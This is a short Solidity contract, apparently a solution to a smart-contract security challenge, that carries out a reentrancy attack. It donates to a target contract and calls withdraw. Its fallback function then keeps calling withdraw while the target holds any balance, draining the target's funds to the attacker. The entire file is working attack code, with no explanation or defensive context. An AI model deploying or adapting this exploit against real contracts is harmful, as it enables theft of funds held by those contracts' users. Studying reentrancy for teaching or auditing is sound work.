// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrancy {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttack {
    address targetAddress;

    function attack(address _targetAddress) public payable {
        targetAddress = _targetAddress;

        IReentrancy target = IReentrancy(_targetAddress);

        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {
        IReentrancy target = IReentrancy(targetAddress);

        if (targetAddress.balance > 0) {
            target.withdraw(targetAddress.balance);
        }
    }
}
